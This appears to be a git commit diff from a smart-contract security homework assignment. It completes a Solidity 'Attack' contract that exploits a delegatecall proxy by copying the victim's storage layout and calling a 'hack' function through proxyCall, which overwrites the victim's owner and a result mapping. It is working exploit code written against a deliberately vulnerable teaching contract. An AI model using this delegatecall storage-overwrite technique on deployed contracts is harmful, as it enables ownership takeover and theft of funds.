545e67340068f167ce380aefaee5d166ca85f26b
root <root@LAPTOP-M6ITM07P.localdomain>
2024-03-21 00:51:15 +0800

    finished

--- hw1/src/Delegation/Delegation.sol
+++ hw1/src/Delegation/Delegation.sol
@@ -1,5 +1,7 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
+import {Test, console2} from "forge-std/Test.sol";
+
 
 interface ID31eg4t3 {
     function proxyCall(bytes calldata data) external returns (address);
@@ -10,6 +12,13 @@ contract Attack {
     address internal immutable victim;
     // TODO: Declare some variable here
     // Note: Checkout the storage layout in victim contract
+    uint256 var0 = 12345;
+    uint8 var1 = 32;
+    string private var2;
+    address private var3;
+    uint8 private var4;
+    address public owner;
+    mapping(address => bool) public result;
 
     constructor(address addr) payable {
         victim = addr;
@@ -17,9 +26,15 @@ contract Attack {
 
     // NOTE: You might need some malicious function here
 
+    function hack(address x) public {
+        result[x] = true;
+        owner = x;
+    }
+
     function exploit() external {
         // TODO: Add your implementation here
         // Note: Make sure you know how delegatecall works
-        // bytes memory data = ...
+        bytes memory data = abi.encodeCall(this.hack, msg.sender);
+        victim.call(abi.encodeWithSignature("proxyCall(bytes)", data));
     }
 }
